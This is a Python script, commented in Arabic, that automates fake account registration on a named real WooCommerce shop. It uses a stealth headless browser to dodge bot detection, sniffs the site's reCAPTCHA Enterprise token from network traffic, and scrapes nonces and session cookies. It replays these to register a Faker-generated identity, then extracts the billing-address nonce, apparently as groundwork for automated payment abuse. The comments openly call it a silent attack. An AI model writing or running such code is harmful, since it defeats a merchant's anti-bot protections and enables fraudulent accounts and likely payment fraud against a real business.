import re
import requests
from faker import Faker
from playwright.sync_api import sync_playwright
from playwright_stealth import Stealth

# --- 1. توليد البيانات العشوائية ---
fake = Faker("en_UK")
f = fake.first_name()
l = fake.last_name()
email_address = f"{f.lower()}.{l.lower()}{fake.random_int(min=100, max=999)}@gmail.com"
password_string = "Willia5766ms#123CR7"

USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'

# مخازن البيانات الحية
captured_token = None
captured_nonce = None
session_cookies = {}  # الكوكيز الحية التي سننقلها

# --- 2. تشغيل المصيدة الصامتة والتقاط الكوكيز والبيانات ---
with Stealth().use_sync(sync_playwright()) as p:
    print("[*] جاري فتح المصيدة الصامتة لتهيئة الكوكيز واقتناص التوكن...")
    browser = p.chromium.launch(headless=True, args=['--no-sandbox', '--disable-setuid-sandbox'])
    context = browser.new_context(user_agent=USER_AGENT)
    page = context.new_page()

    # اعتراض الشبكة لاقتناص التوكن
    def intercept_response(response):
        global captured_token
        if "recaptcha/enterprise/reload" in response.url:
            try:
                body = response.text()
                match = re.search(r'rresp","(.+?)"', body) or re.search(r'rresp Trimmed","(.+?)"', body)
                if match:
                    captured_token = match.group(1)
                    print("[+] تم اقتناص توكن الكابتشا الحية!")
            except Exception:
                pass

    page.on("response", intercept_response)
    
    # فتح الصفحة لكي يسقط السيرفر الكوكيز الأساسية والـ Nonce
    page.goto("https://greenmethods.com/my-account/", wait_until="domcontentloaded", timeout=60000)
    page.wait_for_timeout(5000)  # مهلة كافية لتهيئة كوكيز الحماية وجوجل كابتشا تلقائياً

    # قشط الـ Nonce الأولي للتسجيل
    html = page.content()
    nonce_match = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', html)
    if nonce_match:
        captured_nonce = nonce_match.group(1)
        print(f"[+] تم اقتناص Register Nonce: {captured_nonce}")

    # 🔥 الأهم: حفظ وإدارة جميع كوكيز الجلسة الحية المتولدة في المتصفح
    for cookie in context.cookies():
        session_cookies[cookie['name']] = cookie['value']
    print(f"[+] تم استخراج وإدارة ({len(session_cookies)}) من الكوكيز الحية للجلسة.")

    browser.close()

# --- 3. الهجوم الصامت: إدارة الجلسة ومطابقة الكوكيز عبر Requests ---
if captured_token and captured_nonce:
    print("\n[*] جاري الانتقال لـ Backend وإرسال طلب POST الصامت بنفس الكوكيز...")
    
    headers = {
        'User-Agent': USER_AGENT,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Origin': 'https://greenmethods.com',
        'Referer': 'https://greenmethods.com/my-account/',
    }
    
    payload = {
        'email': email_address,
        'password': password_string,
        'woocommerce-register-nonce': captured_nonce,
        '_wp_http_referer': '/my-account/',
        'g-recaptcha-response': captured_token,
        'register': 'Register'
    }
    
    # بناء جلسة Requests وضخ الكوكيز المدارة داخلها
    session = requests.Session()
    session.cookies.update(session_cookies) # دمج كوكيز Playwright بالكامل داخل الجلسة
    
    # إرسال الطلب مع السماح بالـ Redirects لأن WooCommerce يحولك تلقائياً بعد نجاح التسجيل
    response = session.post(
        "https://greenmethods.com/my-account/", 
        data=payload,
        headers=headers,
        allow_redirects=True
    )
    
    # فحص الرد النهائي (هل تحتوي الجلسة المحدثة على كوكيز تسجيل الدخول؟)
    final_html = response.text
    if "logout" in final_html.lower() or "customer-logout" in final_html.lower():
        print("[🎉] مبروك! نجحت إدارة الكوكيز وتم إنشاء الحساب صامتاً تماماً.")
        
        # استخراج الـ Nonce النهائي المطلوب (Billing Nonce) من داخل الجلسة الحية الحالية
        billing_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="([^"]+)"', final_html)
        if billing_nonce:
            print(f"[🏆] النتيجة النهائية المطلوبة (Billing Nonce): {billing_nonce.group(1)}")
        else:
            # إذا لم نكن في صفحة الفواتير مباشرة، نتوجه إليها بنفس الجلسة المدارة الحية
            print("[*] جاري التوجه لصفحة الفواتير لاستخراج الـ Nonce المفقود...")
            billing_res = session.get("https://greenmethods.com/my-account/edit-address/billing/")
            billing_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="([^"]+)"', billing_res.text)
            if billing_nonce:
                print(f"[🏆] النتيجة النهائية المطلوبة (Billing Nonce): {billing_nonce.group(1)}")
            else:
                print("[-] تعذر قشط الـ Billing Nonce، يرجى مراجعة هيكل صفحة الفواتير.")
    else:
        print("[-] فشل التسجيل.")
        if "recaptcha verification failed" in final_html.lower():
            print("⚠️ السبب: رغم مطابقة الكوكيز، سكور التوكن نفسه منخفض (بسبب الـ IP الخاص بالـ VPS).")
        else:
            print("⚠️ راجع الرد، قد تكون هناك رسالة خطأ أخرى.")
else:
    print("[-] إلغاء الطلب: تعذر جمع التوكن أو الـ Nonce من المصيدة.")
